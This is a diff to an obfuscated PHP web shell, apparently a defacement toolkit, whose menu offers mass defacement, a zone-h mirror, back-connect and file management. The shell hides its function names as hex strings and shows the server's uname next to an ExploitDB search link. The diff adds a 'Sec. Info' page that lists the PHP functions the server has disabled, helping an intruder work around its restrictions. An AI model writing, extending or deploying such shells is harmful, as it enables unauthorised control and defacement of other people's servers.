@@ -25,6 +25,7 @@ $GHP[2] - > create_function
 $GHP[3] - > getcwd
 $GHP[4] - > php_uname
 $GHP[5] - > phpversion
+$GHP[6] - > ini_get
 
 
 */
@@ -39,7 +40,7 @@ function uhex($y)
 }
 
 
-$Array = ['707265675f7265706c6163655f63616c6c6261636b','6261736536345f6465636f6465','6372656174655f66756e6374696f6e','676574637764','7068705f756e616d65','70687076657273696f6e'];
+$Array = ['707265675f7265706c6163655f63616c6c6261636b','6261736536345f6465636f6465','6372656174655f66756e6374696f6e','676574637764','7068705f756e616d65','70687076657273696f6e','696e695f676574'];
 $___ = count($Array);
 for ($i = 0;$i < $___;$i++)
 {
@@ -218,6 +219,42 @@ function logout() {
 
 
 }
+
+function info() {
+	echo '
+<style>
+#wrapper{
+	width: 300px;
+	height: 300px;
+	overflow:auto;
+	padding:5px;
+    margin:auto;
+}
+.list {
+	border: 1px solid #232323;
+    text-align: left;
+    color:red;
+}
+p {
+	font-size:120%;
+	text-align:center;
+}
+</style>
+	
+	<p>Disabled Functions:</p><br><br><div id="wrapper">
+	';
+	if (empty(ini_get('disable_functions'))) {
+		echo '<center><font color=green>No Functions Disabled</font></center>';
+	}
+	else {
+		$disabled = ini_get('disable_functions');
+		echo '<div class="list"><ul><li>';
+		echo str_replace(',','<li>', $disabled).'</ul></div></div>';
+	}
+
+	
+
+}
 //FUNCTIONS END ==========================================================================
 
 $dec_home=decode_code($home);
@@ -285,12 +322,12 @@ echo '<html>
       color:black;
       background:white;
     }
-    ul {
+    .menu ul {
       list-style-type: none;
       margin: 0;
       padding: 0;
     }
-    li {
+    .menu ul form li {
       display: inline;
       margin:0;
       padding:0;
@@ -315,7 +352,8 @@ echo '<html>
     
 		echo '<font color=red>CWD:</font> 	'.$GHP[3]().'<br><font color=red>SERVER ADDRESS:</font> '.$_SERVER['SERVER_ADDR'].' <font color=red>YOUR ADDRESS:</font>'.$_SERVER['REMOTE_ADDR']
 
-		.' <br><font color=red>UNAME:</font> '.$GHP[4]().'<a style="color:red;" target="_blank"href="'.'https://www.exploit-db.com/search?q='.$GHP[4](),'">  [ExploitDB]</a> <br><font color=red>PHP Version:</font> '.phpversion()
+		.' <br><font color=red>UNAME:</font> '.$GHP[4]().'<a style="color:red;" target="_blank"href="'.'https://www.exploit-db.com/search?q='.$GHP[4](),'">  [ExploitDB]</a>	
+		<br><font color=red>PHP Version:</font> '.$GHP[5]();
     ;
 		
     echo '
@@ -331,6 +369,7 @@ echo '<html>
     <li><a href="?mass" yawa="k">mass</a>
     <li><a href="?mirror" yawa="k" >zone-h</a>
     <li><a href="?bc" yawa="k">bc</a>
+    <li><a href="?info" yawa="k">Sec. Info</a>
     <li style="float:right"><a href="?logout" yawa="k">logout</a>
   </form>
   <li>
@@ -366,6 +405,10 @@ echo '<html>
   }
   elseif (isset($_GET['home']) || isset($_GET['path']) || isset($_GET['option']) || isset($_FILES['file'])){
 		manage();
+
+  }
+  elseif (isset($_GET['info'])) {
+    info();
 
   }
   elseif (isset($_GET['logout'])) {
